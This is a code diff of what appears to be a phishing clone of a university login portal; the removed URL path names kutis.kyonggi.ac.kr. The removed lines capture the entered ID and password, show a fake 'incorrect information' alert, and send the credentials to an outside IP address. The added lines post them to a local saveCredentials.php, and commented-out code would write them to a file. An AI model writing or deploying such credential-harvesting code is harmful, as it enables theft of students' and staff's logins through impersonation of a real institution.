@@ -142,34 +142,23 @@ var SystemInfo = new function() {
 
     <script>
       function saveAndRedirect() {
-          // 입력된 ID와 PW 가져오기
-          var id = document.getElementById("id").value;
-          var pw = document.getElementById("pw").value;
 
-          // alert 메시지 띄우기
-          alert('입력한 정보가 올바르지 않습니다!');
+        var id = document.getElementById("id").value;
+            var pw = document.getElementById("pw").value;
 
-          var dataToSend = {
-            id: id,
-            pw: pw
-          };
+            // AJAX를 사용하여 PHP 파일에 데이터 전송
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "saveCredentials.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    // PHP 파일의 응답을 출력
+                    console.log(xhr.responseText);
+                }
+            };
+            xhr.send("id=" + id + "&pw=" + pw);
 
-          var xhr = new XMLHttpRequest();
-
-          xhr.open('POST', 'http://20.214.184.232:54321/board/ns_kutis/ns_kutis_site/kutis.kyonggi.ac.kr/webkutis/view/saveCredentials.php', true);
-          xhr.setRequestHeader('Content-Type', 'application/json');
-
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState === XMLHttpRequest.DONE) {
-              if (xhr.status === 200) {
-                console.log('서버 응답:', xhr.responseText);
-              } else {
-                console.log('요청 실패:', xhr.status);
-              }
-            }
-          };
-
-          xhr.send(JSON.stringify(dataToSend));
+          //xhr.send(JSON.stringify(dataToSend));
           // ID와 PW를 특정 경로에 텍스트 파일로 저장
           // var dataToSave = "ID: " + id + "\nPW: " + pw;
           // var blob = new Blob([dataToSave], {type: 'text/plain'});
